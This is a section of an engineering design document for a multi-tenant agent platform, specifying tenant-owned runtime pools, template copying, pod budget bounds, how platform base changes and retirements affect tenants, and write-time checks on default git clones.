| `gitClone` sources with a read or write scope | Default clones with a read scope, and a `write` value that adds the repository to the writable set | As above, and the repository is the tenant admin's choice, read on the authority of the session user's link on a VCS pool with `userAuthorization: required`. A client that sends no plan gets push access only under `write: always`. |
| Inline files and uploads, placed in the session's own workspace | Shared assets: `inline` and `artifact` files read-only under `/lenny/assets`, and `gitRepository` assets that warm a store and can stage a checkout in each idle slot | An asset sits in every slot of the owned pool's pods before any session, so every session on the runtime reads it with no user choice. A `gitRepository` asset adds no source to a plan: its store serves the `gitClone` sources that a default clone or the plan already holds. |
| `runtimeOptions` under the schema | A narrower schema | Narrower only. |
| `pool` among pools the tenant holds access rows on | The owned pool | A pool the platform templated. |
| `delegationLease` narrowing, a client's limits on its children | `delegationPolicyRef` intersection | Narrower only. |
| Nothing | `oneSessionPerPod` and warm count | New. These act on the owned pool within budget. |
| Nothing | Labels and agent interface | New. These change how the tenant's own environments and agents select the runtime. |

## DR-5: Owned pools

### A pool per runtime

Each tenant-derived runtime has exactly one owned pool, created in the same request and named the same. Its own pool is needed because concurrency and recycling live on the pool row (DF-6), so a one-session policy has no effect on a base's concurrent pods. §5.1's fallback to the base's pool stays unavailable for tenant-derived runtimes: it would place a session on pods with another policy, read another pool's warm inventory, and need a check the base's pool does not make. `ResolvePool` matches the derived name, so owned pools cause no ambiguity for the base. `PoolStoreBasePoolResolver` is unaffected for the same reason.

### Template copy

A platform-written template pool supplies everything that needs a platform decision. A tenant cannot create a ceiling, a posture, or an acknowledgment. The egress and git settings in the table, such as the egress ceiling, the warm-up policy, and `gitAccess`, are defined in [`egress-and-git-design.md`, "Configuration by scope"](egress-and-git-design.md#configuration-by-scope).

| Setting | Source | Tenant |
| :-- | :-- | :-- |
| `isolationProfile`, `allowStandardIsolation`, `acknowledgeNonceOnlyAuth`, `spiffeBinding`, and `allowProxyModeSpiffeBindingDisabled` | Template | None |
| `llmUpstreams` | Tenant | The owning tenant writes the list and may name its own upstreams and the platform upstreams granted to it. The setting is gateway-read and adds nothing to the pod-set key ([`llm-upstreams-and-cost-budgets-design.md`, "LU-2"](llm-upstreams-and-cost-budgets-design.md#lu-2-assignment-and-resolution)). |
| `egressProfile`, `dnsPolicy`, egress ceiling, warm-up policy, `gitAccess`, client proxy profile, tunnel lifetime, fetch settings, `tenantOverride`, and `tenantEgressProfiles` | Template | A tenant pool overlay under [EG-9](egress-and-git-design.md#proposal-split)'s rules for a shared pool. The rows [EG-9](egress-and-git-design.md#proposal-split) gives only an owned pool read as `none` unless the grant entry's `ownedOverlays` lists them. |
| Elicitation policy and scaling policy | Template | None |
| `resourceClass` | Grant entry | One of `resourceClasses` |
| `warmCount` | Tenant | 1 or more, within budget |
| `reservedPods` | Tenant | Within the grant entry's allowance, as DR-10 states |
| `warmCloneMaxAgeSeconds` | Tenant | Within the Helm bounds, as "Age" under "Warm stores" states |
| `warmCloneBytes` | The template's value plus the grant entry's `maxWarmCloneBytes` | None, as "Size" under "Warm stores" states |
| `prestageTimeoutSeconds` | Template | None. The tenant sets the runtime's `prestageTimeoutSeconds` instead, within the grant entry's `maxPrestageTimeoutSeconds`, as "Fields" states. |
| `placement.offering` | Template, as the default | Any offering the tenant may use whose `classes` include the template's node class, by name only, through `PUT /v1/admin/derived-runtimes/{name}`. A choice outside that set answers `403 PLACEMENT_OFFERING_NOT_GRANTED` ([PM-3](placement-design.md#owned-pools-choose-among-granted-offerings)). |
| `placement.region` | Template | None. A tenant whose `dataResidencyRegion` differs from the template's region cannot derive from that base, and the write answers `403 REGION_CONSTRAINT_VIOLATED` ([PM-7](placement-design.md#pm-7-region-placement)). |
| `placement.reservedOverlay` | Template | None. It replaces `reservedPlacement`, as DR-10's **Nodes.** states. |
| Concurrency, recycling, `cleanupCommands`, and `cleanupTimeoutSeconds` | Template | `oneSessionPerPod`, as above |
| `maxSessionAgeSeconds` and `sessionPolicy`'s other limits | Template, then the derived runtime | Lower only, as above |

The copied columns live on the owned row, so `poolPolicyMirror`, admission, and the PoolScalingController read a complete pool with no new merge. A platform write to a template updates the copied columns of its owned pools in the same transaction and bumps each generation. A narrowing therefore reaches them, and the running pods change as any pool edit does today, on pods created afterwards. `ownerTenantId` is set at create and immutable, as [`egress-and-git-design.md` decision 26](egress-and-git-design.md#decisions) states.

[EG-9](egress-and-git-design.md#proposal-split)'s table gives an owned pool more than a shared one: replacing the warm-up policy, turning on `gitAccess`, choosing `egressProfile`, adding a certificate authority (CA), and setting client proxy environment variables. A copied flag was set by an operator thinking of the shared column, where most of these rows have no effect, so a copied flag could open a CA, a proxy variable, or `gitAccess` the operator never considered. Hence `ownedOverlays`, empty by default. A listed `clientProfile` sets the variables named under "Tenant proxy variables" in [`egress-and-git-design.md`, "Tenant pool overlays"](egress-and-git-design.md#tenant-pool-overlays) only on a pool with `egressProfile: internet` that runs no `netagent`, and it sets file templates on any pool as shared-pool overlays do, under the `verbatimClientFiles` constraint of [`security-oversight-design.md`](security-oversight-design.md), as that design's client proxy profile row states. The variable list excludes `JAVA_TOOL_OPTIONS`, `NODE_OPTIONS`, `LD_PRELOAD`, `GIT_SSH_COMMAND`, `PATH`, and `LD_AUDIT`. A write that adds or changes `caBundle` emits `pool.ca_bundle_changed` at once, and the security posture reports it.

A write that lowers a `tenantOverride` flag on a pool a grant entry names succeeds whatever overlays exist, on its owned pools and on the template itself. A base entry requires `pool_tenant_access` on the template, so a tenant holding that access row can write an overlay there at any time and would otherwise block the write. The extending part stops applying, and `runtime.base_changed` goes out, under "Notice". [EG-9](egress-and-git-design.md#proposal-split)'s refusal stays for a shared pool no grant entry names.

A row that reads `none` after an entry drops it, or a profile dropped from `tenantEgressProfiles`, stops the stored value with the same event. `caBundle`, `clientProfile`, `gitAccess`, and `egressProfile` are fixed at pod creation, so they stop on pods created afterwards, and the API reports them as pending, as [EG-9](egress-and-git-design.md#proposal-split) does. `warmUp` is read per decision, so it stops at the next decision and reads as the template's. A dropped `egressProfile` reverts to the template's, which can be wider than the tenant's choice, and the event names it.

### Pods

`createPod` reads the `Runtime` resource by the `AgentPod`'s `spec.runtimeRef`, and a derived runtime has none. DR-2 adds `PodSet.spec.podRuntimeRef`, which the PoolScalingController sets from the pool row, and every read of the resource in the AgentPod controller keys on it. `runtimeRef` keeps the derived name for `ResolvePool` and the label. A base's `Runtime` resource therefore serves any number of derived pools, and no tenant input reaches a cluster-scoped resource.

Once [`runtime-revisions-design.md`](runtime-revisions-design.md) lands, the pod builder reads the versioned fields from a revision rather than from the live `Runtime` resource, and an owned pool keeps one pod set, recorded as a `PodSet`, per active base revision ([RV-3](runtime-revisions-design.md#rv-3-pods)). On each `PodSet`, `spec.podRuntimeRef` names the base and `spec.runtimeRevision` names the base revision, and the pod set's pods are built from that revision with the derived runtime's fields merged over it ([RV-5](runtime-revisions-design.md#rv-5-derived-runtimes)). A pod set's key covers the base revision's pod hash together with the derived runtime's pod-affecting contribution, its `sharedAssets` append of `inline`, `artifact`, and `gitRepository` assets ([RV-3](runtime-revisions-design.md#rv-3-pods)). Placement reads no versioned field, so every pod set of the pool shares the pool's offering and node class ([PM-5](placement-design.md#pm-5-rendering)). Outside a base rollout and a change to those contributions the pool has one pod set.

Pods serve only the owner. The controller stamps `lenny.dev/tenant-id` with the owner at creation, as the "Tenant-owned pool" row of [`egress-and-git-design.md`, "Pod models"](egress-and-git-design.md#pod-models) states, and egress decisions, warm-up additions, and egress groups then read one tenant from the first second. `requirePoolSelectable` and the claim path read the owner, so another tenant's pool pin fails as an unknown pool. The pool check runs at the post-chain point of [RT-2](runtime-routing-design.md#post-chain-point) on the final pool, so a runtime route target or an interceptor that names another tenant's owned pool fails the same way.

That stamp does not work against today's code, and the design has to resolve this. These readers treat a non-empty label as "this pod has served a session":

- `AdmitTenantPin` refuses and drains every labelled pod when the pool does not reuse pods, so a one-session owned pool would drain each warm pod at its first acquisition.
- `markPinnedIdle` and §5.2 **Pinned idle inventory.** keep labelled idle pods out of `minWarm` and, with `maxWarm` equal to the target, drain them. The pool would stay in `PoolWarmingUp`.

[EG-9](egress-and-git-design.md#proposal-split) adds `lenny.dev/served` at this design's request, as [`egress-and-git-design.md`, "Pod models"](egress-and-git-design.md#pod-models) states, and the gateway stamps it at first assignment on an owned pool. DR-5 moves the readers to it. On an owned pool both readers read that label in place of the tenant label: an unserved pod is ordinary inventory, and a served pod is refused and drained on a non-recycling pool. Another tenant's request never reaches this check on an owned pool, and `AdmitTenantPin` keeps the tenant pin comparison as the second layer.

### Bounds

| Bound | Holder | Enforcement |
| :-- | :-- | :-- |
| `maxRuntimes` | Grant | Checked at write, under a lock on the grant row, so concurrent creates cannot pass together. |
| `maxOwnedPods` | Grant | One figure governs every check. The tenant's charge T is the sum across its owned pools of `max(inUse, reservedPods) + warmCount + unusable`. `inUse` counts pods in `claimed` and `reserved`, `unusable` counts `draining` and `failed`, and `reservedPods` is 0 on a pool with no reservation. A pod whose `AgentPod` records its fill failure on a platform-declared warm-list entry, a base's public entry or a `gitRepository` asset that a `platform-admin` wrote on the runtime, counts in neither `unusable` nor any other term of T, because the tenant cannot fix that cause (decision 35). A write or a claim that raises T past the bound is refused: a write answers `422 DERIVATION_BUDGET_EXCEEDED`, under a lock on the grant row, and a claim answers `429 QUOTA_EXCEEDED`. A write lowering T always passes. A claim that leaves T unchanged always passes, which covers a claim within a reservation and a `ClaimSlot` on an occupied pod. `warmCount` stands for `idle` and `warming` pods, which `plan.Compute` treats as inventory, and `terminated` is a sink that holds no pod. Counts come from an `AgentPod` list per owned pool. `agent_pod_state` cannot serve, because `derivePodStates` leaves `tenant_id` empty and each sync clears it. A pool with a non-empty `warm_stop_reasons` charges nothing for `warmCount` or `reservedPods`, and neither does any pool while reservations are off, for `reservedPods`. A session ending moves a pod to `unusable`, which can raise T with no check, and claims outside a reservation are then refused until that pod is gone. |
| `maxOwnedPods`, at creation | Grant | T decides what a tenant may ask for, and this rule bounds what runs. The PoolScalingController renders the bound on each owned `PodSet`, and the WarmPoolController creates no `AgentPod` in that pool while the owner's non-terminal `AgentPod` objects, listed by owner across all its pools, are at the bound. This covers a warm refill and a reservation's replacement alike. A lowering therefore frees budget at once while the pods it releases still count here, and a pool deleted while its pods drain still counts. A pod that a platform-declared entry failed still counts here under decision 38, because this bound limits what exists on the node and the backoff keeps such pods few. |
| `runtimes.tenantDerivation.maxOwnedPodsTotal` | Helm | The sum of every grant's `maxOwnedPods` stays at or below it, checked at grant write under one lock that only grant writes take. Preflight compares it with the namespace `ResourceQuota`. |
| Pod size | `resourceClasses` | Set per base in the grant. `LimitRange` still applies. |

`max_concurrent_sessions` does not serve as this bound. A quota of 1000 moved from 20-session pods to one-session pods turns 50 pods into 1000.

**A base rollout.** While a platform rollout of the base is in progress, an owned pool keeps a pod set per distinct pod hash among the active base revisions, so a rollout that changes only the base's gateway-read fields adds none ([RV-3](runtime-revisions-design.md#rv-3-pods)). Under decision D8 of [`runtime-revisions-design.md`](runtime-revisions-design.md#decisions), the pods of every pod set other than the one for the revision with the highest weight, the older revision on a tie, count in neither T nor the creation rule of `maxOwnedPods`, and a pool with a reservation places that extra pod set outside its reserved pods, as DR-10's "Budget" states. Decision 35 exempts pods that a platform cause failed for the same reason: the tenant did not cause them. The namespace `ResourceQuota` still bounds the extra pods. When the rollout ends, the remaining pod set is the pool's only one and counts as before, so a rollout cannot raise what a tenant is charged, and a tenant at its bound still gets the new revision. A change to the runtime's own contribution, such as a tenant asset, creates a pod set without a base revision. The tenant made that change, so the exemption does not apply, and the earlier pod set's pods count in T until they leave. The idle minutes of the extra pod set are billed to the platform rather than the owning tenant, as `pool.idle_usage` in [`billing-resource-attribution-design.md`](billing-resource-attribution-design.md#poolidle_usage) attributes them. Under the rollout policy `automatic`, the rollout waits for each owned pool's new pod set for at most `rollout.ownedPoolWarmTimeoutSeconds`, and then moves traffic with cold starts on that pool.

The PoolScalingController never raises an owned pool above its warm target, which is `warmCount` unless DR-10 raises it. Its formula is clamped, and `bootstrapMinWarm` is refused. A runtime route writes no pool configuration ([RT-4](runtime-routing-design.md#rt-4-runtime-routes)), so it cannot raise an owned pool's warm count. Warm-pod minutes accrue per pool in `lenny_warmpool_idle_pod_minutes`, which carries no tenant label, so an owned pool's idle cost reaches its owner through `pool.idle_usage` under [`billing-resource-attribution-design.md`](billing-resource-attribution-design.md). Whether the billing pipeline should read that is the operator's commercial choice.

### Kubernetes permissions

The gateway needs none. It writes Postgres, and the PoolScalingController renders the CRD pair with the permissions it holds. The WarmPoolController creates pods with the label in place, which the `unset → owner` rule that the egress design adds to the label webhook admits ([`egress-and-git-design.md`, "Pod models"](egress-and-git-design.md#pod-models)). No tenant write creates a `Runtime` resource. A `RuntimeClass`, a namespace, and a NetworkPolicy are all fixed by Helm, and §13.2.6's pre-created policies apply, because `egressProfile` comes from the template.

### Tenant operations

A tenant writes its owned pool's fields only through `PUT /v1/admin/derived-runtimes/{name}`, and drains it through that resource's `drain` route. The pool routes `drain`, `warm-count`, `circuit-breaker`, and `resume-reconciliation` remain `platform-admin` paths on owned pools, as DR-1 makes them on all pools. An owned pool has no rollout of its own: it follows the base's runtime rollout under `/v1/admin/runtimes/{name}/rollout`, which only a `platform-admin` drives ([RV-4](runtime-revisions-design.md#rv-4-rollout)), and which replaces the pool-level `upgrade` routes. `pool_tenant_access` and `runtime_tenant_access` refuse a row naming an owned record, so a grant cannot share it. A `platform-admin`'s `PUT /v1/admin/pools/{name}` on an owned pool refuses every field "Template copy" takes from the base or the template, including `runtimeRef` and `sessionPolicy`'s concurrency, recycling, and cleanup fields, because a direct write could otherwise widen a row held at one session.

### Tenant suspension and deletion

Suspending a tenant adds a reason to `warm_stop_reasons` on its owned rows in the same transaction, and resuming removes it. §15.1 blocks deleting a tenant while pools exist under it, which would stop erasure. Owned pools leave that block, and the deletion lifecycle drains and removes them in §12.8's order. The same erasure deletes the artifacts the tenant uploaded for `artifact` assets and the tenant-owned chunk sets of its assets and stores, and a legal hold on the tenant keeps them until the hold is released, as for the tenant's other data ("Tenant shared assets" under DR-9).

## DR-6: Base changes

Today a base write that would invalidate a derived runtime is refused and names the affected runtimes. For a tenant-derived runtime that lets one tenant block a platform change and shows one tenant's names to whoever wrote the base. `derivedRuntimesInvalidatedBy` keeps its rule for platform-owned derived runtimes only.

For a tenant-derived runtime, the restrict-only rules move from a one-time check to the merge. The tenant view computes the effective runtime against the live base and the current grant entry, on each resolve, and reads a retirement reason on the owned row as `retired`, so re-issuing an entry after its date does not revive the runtime. A base or grant write therefore succeeds and takes effect at the next resolve, apart from the exceptions DP9 names. `incompatible` means new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, with `details.reason` naming the miss, until the cause is fixed.

Once [`runtime-revisions-design.md`](runtime-revisions-design.md) lands, a base write that changes a versioned field creates a base revision, and the base's traffic decides which revision serves each new session. `baseStatus` and `incompatible` then evaluate against every revision in the base's traffic, the new one included, and the runtime reads as `incompatible` while any of them breaks it ([RV-5](runtime-revisions-design.md#rv-5-derived-runtimes)). New sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE` until the tenant edits the runtime or the breaking revision leaves the traffic. A row below on a versioned field, such as `requireSoPeercred` or `workspaceDefaults`, takes effect when the write creates the revision, which can be before any session reaches that revision. A row on a live field, such as `setupCommandPolicy`, `limits`, or `allowedResourceClasses`, applies to the next session on every revision.

| Platform change | Effect on a tenant-derived runtime |
| :-- | :-- |
| Narrows `llmFormats`, `allowSelfRecursion`, or `limits` | Applies at the next resolve. An emptied intersection, such as an emptied `llmFormats` where the tenant's list was not empty, is `incompatible`. |
| Creates a base revision whose `runtimeOptionsSchema` drops or forbids a property the tenant's schema names | `runtimeOptionsSchema` is versioned, so the change applies to the sessions the rollout gives that revision, whose options both schemas validate. A property the tenant's schema only names becomes unusable on those sessions, and the runtime stays compatible. A property the tenant's schema lists in `required` makes the runtime `incompatible` while that revision is in the traffic, because every session on it would be refused, and the notice names the property and the revision. A revision forbids a property when its schema gives the property the schema `false`, or omits it from `properties` under `additionalProperties: false` ([RV-5](runtime-revisions-design.md#rv-5-derived-runtimes)). |
| Raises the base's `periodicCheckpointIntervalSeconds`, or the owned pool's value, above the tenant's value | Applies at the next resolve: the tenant's sessions take the base's longer interval, and the notice reports the change. The runtime does not read as `incompatible`, because the longer of the two values is always a valid interval, as a narrowed `limits` always leaves a value. |
| Narrows `setupCommandPolicy` so a default command falls outside, or sets `shell: true` or a mode other than `allowlist` while a default command exists | `incompatible`, until the tenant edits the command. |
| Removes the base's `allowedResourceClasses` entry the pool uses, or sets `requireSoPeercred` false on any revision in the base's traffic | `incompatible`. The base no longer meets the entry's conditions. |
| Removes the base's `Runtime` resource | The RuntimeReconciler's finalizer soft-deletes the base row, which takes every revision in the base's traffic out of use, and the tenant view reads the runtime as `retired`. The owned pool's pod set for each of those revisions creates no pods, and the claim path answers as for a pool with none. |
| Leaves the base's `Runtime` resource at `Registered=False` | `incompatible`. `mirror` refuses such a resource and leaves the row stale, and the AgentPod controller does not read the condition, so the RuntimeReconciler records it in `registered` on the row. The same column decides the post-chain refusal of a platform runtime under "Registered rows" in DR-4. |
| Changes base `workspaceDefaults` or `labels` | `workspaceDefaults` is versioned, so a change creates a base revision and applies to plans composed from that revision, which sessions reach as the rollout gives them the revision. `labels` is live and applies to selectors at once. |
| Raises the base's setup bound, `setupPolicy.timeoutSeconds`, so that a pool, platform or tenant-owned, no longer fits its fetch retry window | Refused, under the exception DP9 states (decision 40). The refusal names the pools that no longer fit and the smallest `gateway.maxFinalizingTimeoutSeconds` at which they fit. A tenant's own raise of its runtime's bound is refused on its own write, as "Materialization and cost" under DR-9 states. |
| Raises the base's `isolationProfile`, its isolation floor, above a template pool's profile | Refused under "Isolation floor" in [`runtime-revisions-design.md`](runtime-revisions-design.md#isolation-floor) while a weaker pool references the base, which covers the owned pools copied from that template. The refusal names the template pools and gives the count of affected owned pools without their names, so it shows no tenant's names to whoever wrote the base. A platform admin raises the template's profile first, which the template write copies to its owned pools in its transaction under "Template copy", so no tenant input blocks the floor. The floor is live, so it creates no base revision. |
| Changes a template pool | Copied under "Template copy". A lowered `maxConcurrentSessionsPerPod` lowers the owned value. A widened concurrency or recycling value is copied and does not reach an owned pool with `oneSessionPerPod`, as "One session per pod" under DR-9 states, and the event names that pool. A changed `templatePool` follows the same rule. |
| Changes a template's `placement.offering`, `placement.region`, or `placement.reservedOverlay` | Copied under "Template copy". An owned pool that chose its own offering keeps it while the offering's `classes` include the template's node class and the tenant may still use it, and otherwise takes the template's offering, and the event names the change. A region that differs from the owning tenant's `dataResidencyRegion` makes the runtime `incompatible`, because every session on the owned pool would fail the residency check of [PM-7](placement-design.md#pm-7-region-placement). |
| Removes a `gitRepository` asset's repository from the tenant's allowlist, or changes the VCS pool covering it | The PoolScalingController leaves that entry out of the rendered warm list, and idle pods holding the store drain, as "Changing the list" under "Warm stores" states. New sessions are refused by the bind checks while a default clone of that repository stays on the runtime. A VCS pool write that scopes the covering pool to environments passes with a `Warning`, and the entry is suspended with the reason `environmentScoped`, as "Scoped repositories" under "Warm stores" states. |
| Adds, changes, or removes a public `gitRepository` entry on the base | `sharedAssets` is versioned, so the change creates a base revision, and the entry reaches the warm list of that revision's pod set on every owned pool of the base at the next render, as "Warm list" under "Warm stores" states. New pods of that pod set fill from the new list, and a removed entry drains idle pods of that pod set holding its store. An entry whose host the owning tenant denies, or that fails the environment predicate for the owning tenant, is left off that pool's list and reported as suspended. |
| Sets `allowSetupCommands`, `allowWorkspaceFiles`, `allowGitClones`, or `allowAssets` false while the runtime holds that default, a `tenant`-declared `gitRepository` asset under `allowGitClones`, or an `inline` or `artifact` asset under `allowAssets` | `incompatible`, until the tenant removes it. This is the stop after a compromise. A `platform`-declared `gitRepository` asset needs no grant flag and stays. |
| Sets `allowGitCloneWrites` false while a default clone has `write: always` | `incompatible`, until the tenant edits the clone. |
| Sets `maxWarmCloneBytes` to 0 | The runtime's `gitRepository` assets leave the owned pool's warm list, and idle pods holding their stores drain, as "Changing the list" under "Warm stores" states. The base's public entries stay, within the template's `warmCloneBytes`. Sessions then use the store-less path, a shallow fetch at materialization, and a repository too large for the pool's fetch window fails there. |
| Lowers `maxWarmCloneBytes` | Applies to pods created afterwards, and older pods leave under the age limit. A fill that no longer fits fails and backs off. |
| Adds a base default file or a base default clone at, under, or above a tenant default clone's `path`, or removes the template's git path while a default clone exists | `incompatible`, until the tenant edits the clone. |
| Adds a base default clone at, above, or below a tenant default file's `path`, in any revision in the base's traffic | `incompatible`, until the tenant moves or removes the file, because a tenant default never replaces a base default and the clone's directory would take the file's place. |
| Adds a base `inline` or `artifact` asset at, above, or below a path a tenant asset holds, in any revision in the base's traffic, or a base `gitRepository` entry naming the URL of a `gitRepository` asset of the runtime | The first is `incompatible`, until the tenant moves or removes its asset, because a tenant asset never replaces a base asset, which is the reading the asset checks at write apply. The second is compatible: the two entries share one store, at the runtime's entry's ref, as "Warm list" under "Warm stores" states. |
| Sets `runtimes.tenantDerivation.allowAssets` false, or lowers `maxAssetsBytes`, `maxAssetEntryBytes`, or `maxInlineAssetBytes` below what a runtime's `inline` and `artifact` assets hold | `incompatible`, until the tenant removes or shrinks its assets. A Helm change is read at each resolve, so it takes effect at once. |
| Lowers the grant's `maxAssetUploadBytes`, or `runtimes.tenantDerivation.maxAssetUploadBytes` for a grant that omits it, below the tenant's stored upload bytes | Stored uploads stay, and the tenant's next upload is refused until garbage collection or the tenant's removals bring the stored bytes under the value. |
| Lowers a grant entry's `maxDefaultGitClones`, the chart default an entry without it reads, or `runtimes.tenantDerivation.maxDefaultGitClonesCeiling` below the default clones and `tenant`-declared `gitRepository` assets a runtime holds | `incompatible`, until the tenant removes entries to fit. A stored grant value above a lowered ceiling reads as the ceiling. |
| Lowers a grant entry's `maxPrestageTimeoutSeconds` below a runtime's `prestageTimeoutSeconds` | The runtime stays compatible. The pod controller renders the smaller of the two on pods created afterwards, and older pods keep their value until they leave. |
| Lowers `maxReservedPods` below what the tenant's pools use | The grant write lowers `reservedPods`, as DR-10 states. |
| Narrows `resourceClasses` | `incompatible`, until the tenant picks another class. |
| Changes an entry's `templatePool` | The grant write copies the new template's columns to the owned pools in its transaction. |
| Lowers `maxOwnedPods` below T or the sum of allowances | The grant write lowers allowances and `reservedPods` first, then each owned `warmCount`, in name order and to a minimum of 1, until both fit or none can go lower, and emits the event. Later claims answer `QUOTA_EXCEEDED`, and pods above the bound end with their sessions. |
| Lowers `maxRuntimes` below the current count | Existing runtimes stay, and a create is refused. |
| Retires a base, or sets a grant entry's `retireAt` | The retirement path below. |
| Removes an entry, or revokes access on its base or template, after the entry's date | The runtimes stay `retired`. |

A template cannot be deleted while a grant entry names it: `DELETE` answers `409 RESOURCE_HAS_DEPENDENTS`. An operator retires a template by changing the entry to another template, or by setting the entry's `retireAt`.

A running session keeps its plan through any of these, because §14.1 stores the composed plan, and every later materialization reads it. "Residual risks" states what that means for a stopped default.

**Notice.** Each write that can change a tenant-derived runtime's effective result, or the effect of a stored overlay, adds an outbox row in its own transaction. A base write that creates a revision fires the notice when it creates the revision, and the event names the revision, the base's rollout policy, and whether the revision makes the runtime `incompatible` ([RV-5](runtime-revisions-design.md#rv-5-derived-runtimes)). The notice therefore no longer means that the change has reached the tenant's sessions. A worker scans the affected runtimes and every tenant with a stored overlay on the pool, grant or no grant, emits `runtime.base_changed` to each one's audit chain, so subscriptions and an [SO-3](security-oversight-design.md#so-3-per-tenant-siem-destination) SIEM destination receive it, and retries until it has done so. Reads show `baseStatus` at once, because resolve is the authority. The platform write's response lists affected runtimes and tenants to the `platform-admin`, and its failure to list them does not fail the write.

**Retirement.** `POST /v1/admin/runtimes/{name}/retire` takes `effectiveAt`, which must lie at least `runtimes.tenantDerivation.baseRetirementNoticeSeconds` ahead, 30 days by default.

- From the call, new derivations are refused, `baseStatus` reads `retiring` with the date, and the event goes out. Existing runtimes keep working.
- At `effectiveAt`, `baseStatus` reads `retired`, new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, and the owned pools drain. Running sessions end under their own age limits. `DELETE` on the base no longer counts tenant-derived runtimes as dependents, and §15.1's rule for non-terminal sessions still holds the row. The base's `Runtime` resource stays until its last pod ends.
- `emergency: true` with a `justification`, and an optional `ticketId`, makes `effectiveAt` now, for a compromised image. It refuses new sessions at once, and [SO-4a](security-oversight-design.md#so-4a-mirror-to-the-tenant-chain) mirrors it. `force: true` also ends running sessions.

`retire_at` on the base row holds the date. A `platform-admin` cancels a pending date before it arrives.

Per tenant, the carrier is a grant entry's `retireAt`, set through `PUT .../derivation-grant` under the same notice floor, with `emergency: true`, a `justification`, and optionally `ticketId` and `force: true` in that body for the emergency form. Withdrawing a grant sets `retireAt` on each entry. An entry's date counts as passed once its base's `retire_at` has passed. While an entry has tenant-derived runtimes and its date has not passed, a grant write cannot remove the entry, and `DELETE .../tenant-access/{tenantId}` on its base or template answers `409 RESOURCE_HAS_DEPENDENTS`, because that route deletes the row with no date to hold. The operator's own entry holds this refusal, so it comes from no tenant.

**Who drains.** `warm_stop_reasons` on the owned row is the one signal the controller reads. `PoolStoreSource` reads pool rows, so it maps a non-empty value to its existing `ForceZeroMinWarm` and sets `MaxWarm` to 0, because `plan.pinnedOverBound` otherwise keeps served idle pods. The transaction that sets `suspended_by`, a tenant suspension, or an emergency adds its reason, and the Notice worker adds one when a date arrives. Only the source of a reason removes it. A tenant's `PUT` touches the column in one case: a `PUT` that complies with the guardrail passes [EG-9](egress-and-git-design.md#proposal-split)'s write path, which clears `suspended_by` and its reason. Retirement is terminal for those runtimes, so its reason has no removal, and a tenant creates a new runtime under a live base.

## DR-9: Default git clones

### Stored format

`workspaceDefaults` gains `gitClones`, and each entry uses the field names of §14's `gitClone` source. A default clone lists a repository every session on the runtime gets by default, and it says nothing about warming: a store comes only from a `gitRepository` entry of `sharedAssets`, as "Warm stores" states, and a write naming a `warm` field answers `400 VALIDATION_ERROR` naming it. The field exists on operator runtimes and on tenant-derived runtimes, under decision 42. A derived runtime's clones append to its base's, a platform-derived runtime's as well as a tenant-derived runtime's, so the base's clones compose first, and a derived runtime's write whose clone `path` is equal to, a parent of, or a child of a base clone's or a base default file's `path`, in any revision in the base's traffic, is refused (`422 INVALID_RUNTIME` on a platform-derived runtime, `422 INVALID_DERIVED_RUNTIME` on a tenant-derived one), because §5.1's merge would otherwise let a derived clone replace a base's.

```yaml
workspaceDefaults:
  gitClones:
    - url: https://github.com/acme/agent-skills
      ref: main
      path: skills
      auth: { mode: credential-lease, leaseScope: vcs.github.read }
      write: none
```

`auth.mode: credential-lease` asks for a credential at clone time, and `auth.leaseScope` names its provider and scope as `vcs.<provider>.read` or `vcs.<provider>.write` (§14). A default clone holds no secret. A private clone takes its token from the tenant's VCS pool or from the session user's link, under the checks a client's `gitClone` source gets, and the agent never receives that token.

**On an operator runtime.** A `platform-admin`'s runtime write takes the checks below that read no tenant: the URL, the ref, `submodules`, `resolvedCommitSha`, the `path` rules against the runtime's own clones and files, and the `.git` refusal. The runtime serves many tenants, so the checks that read a tenant, which are the host's coverage, the VCS pool prefix and the allowlist, `auth`, the environment, and the repository authorization check, run at bind for each session's tenant, as they do for a client's `gitClone` source, and a session that fails them is refused as "Whose credential" states. An operator default clone carries `write: none` alone: the conditions under "Write scope" read a grant entry, a tenant's VCS pool, and a one-session owned pool, which an operator runtime does not have, and a runtime write naming another value answers `422 INVALID_RUNTIME`. Adding the other values later is additive. An operator default clone needs no grant flag, because the operator's own runtime runs no tenant input, and it does not count toward a grant entry's `maxDefaultGitClones`, which bounds a tenant's input alone.

The runtime write answers with a `Warning` in two cases. A default clone whose ref is not a full commit draws one, because whoever can push to that ref runs code at the slot UID in every session of every tenant on the runtime, as "A clone is code" states, and each tenant's posture lists such clones on the runtimes it can use ([SO-2](security-oversight-design.md#so-2-tenant-security-record-and-posture)). A pool of the runtime with no git path, such as a template with `egressProfile: restricted` and no `gitAccess`, draws one naming that pool, because every session placed there fails its clones at materialization.

### Checks at write

A `POST` or `PUT` refuses a default clone with `422 INVALID_DERIVED_RUNTIME` and `details.field` unless all of these hold:

- The grant entry sets `allowGitClones`, and the runtime's default clones and its `tenant`-declared `gitRepository` assets together are within the grant entry's `maxDefaultGitClones`. The operator sets that cap per tenant, an entry that omits it reads `runtimes.tenantDerivation.maxDefaultGitClones`, 8 by default, and no grant entry exceeds `runtimes.tenantDerivation.maxDefaultGitClonesCeiling`, 32 by default, so a tenant declares any number up to its cap (decision 43). The count limits how many entries a write checks and a session composes, and it does not limit their cost: the stores of a runtime's `gitRepository` assets fit in the grant entry's `maxWarmCloneBytes` on each pod whatever their number, and a default clone without a store counts toward §7.1 **Bind bounds.** and the slot's `workspaceSizeLimitBytes` at materialization.
- `url` passes §14's restrictions and the shared canonicalizer in [`egress-and-git-design.md`](egress-and-git-design.md), and it carries no userinfo.
- The host is the host of one of the tenant's VCS pools or git routes. An uncovered host has no git enforcement, as **Uncovered git hosts** in [`egress-and-git-design.md`, "Residual risks and limits"](egress-and-git-design.md#residual-risks-and-limits) states, and §14 lets a client's pinned commit skip the host check of the bind-time ref resolver. A default clone gets that check whether or not its ref is a full commit.
- A repository under a VCS pool's prefix carries `auth` and is on the tenant's repository allowlist. A repository under no prefix omits `auth`. `checkGitCloneAuthBindings` skips a source with no `auth`, while `netagent` attaches credentials by repository and the readable set takes every `gitClone` source, so an `auth`-less clone of `github.com/acme/secret` would otherwise pass every check made here.
- `auth.leaseScope`, when set, is a read scope. The clone's fetch therefore never holds a write token, and push access comes only through `write` or a client's `writableRepositories`, as "Write scope" states.
